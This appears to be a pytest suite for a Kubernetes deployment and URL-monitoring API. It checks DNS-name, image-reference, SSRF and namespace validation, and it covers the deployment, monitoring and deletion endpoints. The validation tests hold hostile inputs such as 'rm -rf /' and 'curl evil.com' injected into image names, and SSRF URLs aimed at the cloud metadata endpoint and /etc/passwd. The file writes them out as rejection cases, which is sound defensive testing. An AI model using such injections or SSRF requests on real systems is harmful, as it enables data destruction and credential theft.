import pytest
from unittest.mock import MagicMock, patch, AsyncMock
from fastapi.testclient import TestClient
from kubernetes.client.rest import ApiException
from app.main import app
from app.services.k8s_client import k8s_service
from app.services.security import (
    validate_dns_name,
    validate_docker_image,
    validate_safe_url,
    validate_target_namespace
)
from app.services.monitor_service import monitor_service
from app.services.builder import builder_service

client = TestClient(app)

# -----------------------------------------------------------------------------
# 1. INPUT VALIDATION & SECURITY (DNS RFC 1123, IMAGE REFS, SSRF)
# -----------------------------------------------------------------------------
def test_dns_name_validation():
    # Valid names
    assert validate_dns_name("my-web-app") == "my-web-app"
    assert validate_dns_name("frontend-v2") == "frontend-v2"
    assert validate_dns_name("app123") == "app123"

    # Invalid names
    with pytest.raises(ValueError, match="RFC 1123"):
        validate_dns_name("-invalid-start")
    with pytest.raises(ValueError, match="RFC 1123"):
        validate_dns_name("invalid_underscore")
    with pytest.raises(ValueError, match="RFC 1123"):
        validate_dns_name("UppercaseApp")
    with pytest.raises(ValueError, match="maximum length"):
        validate_dns_name("a" * 64)


def test_docker_image_validation():
    # Valid image references
    assert validate_docker_image("nginx:alpine") == "nginx:alpine"
    assert validate_docker_image("ghcr.io/org/my-app:v1.2.3") == "ghcr.io/org/my-app:v1.2.3"
    assert validate_docker_image("registry.example.com:5000/app:latest") == "registry.example.com:5000/app:latest"

    # Malicious or invalid references
    with pytest.raises(ValueError, match="Invalid character"):
        validate_docker_image("nginx:latest; rm -rf /")
    with pytest.raises(ValueError, match="Invalid character"):
        validate_docker_image("nginx:latest && curl evil.com")
    with pytest.raises(ValueError, match="cannot start with a hyphen"):
        validate_docker_image("--privileged")
    with pytest.raises(ValueError, match="Invalid character"):
        validate_docker_image("my app:latest")


def test_ssrf_prevention():
    # Loopback & Localhost
    with pytest.raises(ValueError, match="SSRF Protection"):
        validate_safe_url("http://localhost:8080")
    with pytest.raises(ValueError, match="SSRF Protection"):
        validate_safe_url("http://127.0.0.1:8000")
    with pytest.raises(ValueError, match="SSRF Protection"):
        validate_safe_url("http://[::1]:8080")

    # Cloud metadata endpoint
    with pytest.raises(ValueError, match="SSRF Protection"):
        validate_safe_url("http://169.254.169.254/latest/meta-data/")

    # Disallowed scheme
    with pytest.raises(ValueError, match="Invalid URL scheme"):
        validate_safe_url("file:///etc/passwd")
    with pytest.raises(ValueError, match="Invalid URL scheme"):
        validate_safe_url("gopher://127.0.0.1:70")

    # Internal domains
    with pytest.raises(ValueError, match="SSRF Protection"):
        validate_safe_url("http://kubernetes.default.svc.cluster.local")


def test_namespace_isolation():
    # Default / target namespace is valid
    assert validate_target_namespace("kubepulse") == "kubepulse"

    # System namespaces are rejected
    with pytest.raises(ValueError, match="restricted cluster namespace"):
        validate_target_namespace("kube-system")
    with pytest.raises(ValueError, match="restricted cluster namespace"):
        validate_target_namespace("kube-public")
    with pytest.raises(ValueError, match="restricted cluster namespace"):
        validate_target_namespace("default")


# -----------------------------------------------------------------------------
# 2. PUBLIC WEBSITE URL AVAILABILITY MONITORING (NON-K8S WORKLOAD)
# -----------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_website_availability_monitor_workflow():
    # Mock probe to return a successful check
    with patch.object(monitor_service, "_probe_url", new_callable=AsyncMock) as mock_probe:
        mock_probe.return_value = {
            "is_up": True,
            "status_code": 200,
            "latency_ms": 42.5,
            "error": None
        }

        # Deploy input as website
        response = client.post(
            "/api/deployments/deploy-input",
            json={
                "source_type": "website",
                "app_name": "public-docs",
                "website_url": "https://example.com"
            }
        )
        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert data["source_type"] == "website"
        assert data["is_deployed_to_k8s"] is False
        assert "Not deployed to Kubernetes" in data["message"]

        # Verify listing monitors
        list_res = client.get("/api/monitors")
        assert list_res.status_code == 200
        monitors = list_res.json()
        assert len(monitors) >= 1
        mon = next(m for m in monitors if m["name"] == "public-docs")
        assert mon["is_available"] is True
        assert mon["is_deployed_to_k8s"] is False
        assert "NOT running as a workload inside the Kubernetes cluster" in mon["notice"]

        # Verify on-demand check
        check_res = client.post("/api/monitors/public-docs/check")
        assert check_res.status_code == 200
        assert check_res.json()["status_code"] == 200

        # Verify delete monitor
        del_res = client.delete("/api/monitors/public-docs")
        assert del_res.status_code == 200


def test_website_monitor_rejects_ssrf():
    response = client.post(
        "/api/deployments/deploy-input",
        json={
            "source_type": "website",
            "app_name": "evil-monitor",
            "website_url": "http://127.0.0.1:9090"
        }
    )
    assert response.status_code == 400
    assert "SSRF Protection" in response.json()["detail"]


# -----------------------------------------------------------------------------
# 3. EXISTING DOCKER IMAGE DEPLOYMENT TO KUBERNETES
# -----------------------------------------------------------------------------
def test_docker_image_deployment_disconnected_raises_503():
    with patch.object(k8s_service, "connect", return_value=False):
        k8s_service.is_connected = False
        k8s_service.error_details = "Cluster dial tcp 127.0.0.1:65339 refused"

        response = client.post(
            "/api/deployments/deploy-input",
            json={
                "source_type": "image",
                "app_name": "my-nginx",
                "image_ref": "nginx:alpine",
                "container_port": 80,
                "replicas": 2
            }
        )
        assert response.status_code == 503
        assert "disconnected" in response.json()["detail"].lower()


def test_docker_image_deployment_success():
    k8s_service.is_connected = True
    k8s_service.apps_v1 = MagicMock()
    k8s_service.core_v1 = MagicMock()

    # Simulate read 404 then create
    k8s_service.apps_v1.read_namespaced_deployment.side_effect = ApiException(status=404, reason="Not Found")
    k8s_service.core_v1.read_namespaced_service.side_effect = ApiException(status=404, reason="Not Found")

    # Mock create deployment return
    mock_created_dep = MagicMock()
    mock_created_dep.metadata.name = "my-nginx"
    mock_created_dep.metadata.namespace = "kubepulse"
    mock_created_dep.spec.replicas = 2
    k8s_service.apps_v1.create_namespaced_deployment.return_value = mock_created_dep

    # Mock create service return
    mock_created_svc = MagicMock()
    mock_created_svc.metadata.name = "my-nginx-service"
    mock_created_svc.metadata.namespace = "kubepulse"
    mock_created_svc.spec.cluster_ip = "10.96.120.45"
    mock_created_svc.spec.ports = [MagicMock(port=80)]
    k8s_service.core_v1.create_namespaced_service.return_value = mock_created_svc

    response = client.post(
        "/api/deployments/deploy-input",
        json={
            "source_type": "image",
            "app_name": "my-nginx",
            "image_ref": "nginx:alpine",
            "container_port": 80,
            "replicas": 2
        }
    )

    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert data["source_type"] == "image"
    assert data["is_deployed_to_k8s"] is True
    assert data["deployment_name"] == "my-nginx"
    assert data["service_name"] == "my-nginx-service"
    assert data["replicas"] == 2

    # Verify that create_namespaced_deployment was called with security context and resource limits
    call_args = k8s_service.apps_v1.create_namespaced_deployment.call_args
    assert call_args is not None
    dep_body = call_args[1]["body"]
    pod_spec = dep_body.spec.template.spec
    assert pod_spec.security_context.run_as_non_root is True
    assert pod_spec.security_context.run_as_user == 10001
    container = pod_spec.containers[0]
    assert container.resources.limits["cpu"] == "500m"
    assert container.resources.limits["memory"] == "512Mi"
    assert container.security_context.allow_privilege_escalation is False


# -----------------------------------------------------------------------------
# 4. GIT REPOSITORY ISOLATED BUILD & DEPLOYMENT
# -----------------------------------------------------------------------------
def test_git_deployment_when_docker_daemon_down():
    k8s_service.is_connected = True
    with patch.object(builder_service, "is_docker_daemon_available", new_callable=AsyncMock) as mock_docker:
        mock_docker.return_value = False

        response = client.post(
            "/api/deployments/deploy-input",
            json={
                "source_type": "git",
                "app_name": "git-app",
                "git_url": "https://github.com/example/repo.git",
                "container_port": 80,
                "replicas": 1
            }
        )
        assert response.status_code == 503
        assert "Docker daemon is not running" in response.json()["detail"]


def test_git_deployment_success_with_isolated_build():
    k8s_service.is_connected = True
    k8s_service.apps_v1 = MagicMock()
    k8s_service.core_v1 = MagicMock()

    k8s_service.apps_v1.read_namespaced_deployment.side_effect = ApiException(status=404, reason="Not Found")
    k8s_service.core_v1.read_namespaced_service.side_effect = ApiException(status=404, reason="Not Found")

    mock_created_dep = MagicMock()
    mock_created_dep.metadata.name = "git-app"
    mock_created_dep.metadata.namespace = "kubepulse"
    mock_created_dep.spec.replicas = 1
    k8s_service.apps_v1.create_namespaced_deployment.return_value = mock_created_dep

    mock_created_svc = MagicMock()
    mock_created_svc.metadata.name = "git-app-service"
    mock_created_svc.metadata.namespace = "kubepulse"
    mock_created_svc.spec.cluster_ip = "10.96.120.46"
    k8s_service.core_v1.create_namespaced_service.return_value = mock_created_svc

    with patch.object(builder_service, "build_from_git", new_callable=AsyncMock) as mock_build:
        mock_build.return_value = {
            "success": True,
            "image_tag": "kubepulse-apps/git-app:latest",
            "app_name": "git-app",
            "git_url": "https://github.com/example/repo.git",
            "branch": "main",
            "message": "Successfully built Docker image."
        }

        response = client.post(
            "/api/deployments/deploy-input",
            json={
                "source_type": "git",
                "app_name": "git-app",
                "git_url": "https://github.com/example/repo.git",
                "container_port": 80,
                "replicas": 1
            }
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert data["source_type"] == "git"
        assert data["image"] == "kubepulse-apps/git-app:latest"
        assert data["deployment_name"] == "git-app"


# -----------------------------------------------------------------------------
# 5. WORKLOAD DELETION & SCALING
# -----------------------------------------------------------------------------
def test_delete_workload_success():
    k8s_service.is_connected = True
    k8s_service.apps_v1 = MagicMock()
    k8s_service.core_v1 = MagicMock()

    response = client.delete("/api/deployments/my-custom-app/workload?namespace=kubepulse")
    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert data["app_name"] == "my-custom-app"
    assert data["deleted_deployment"] is True
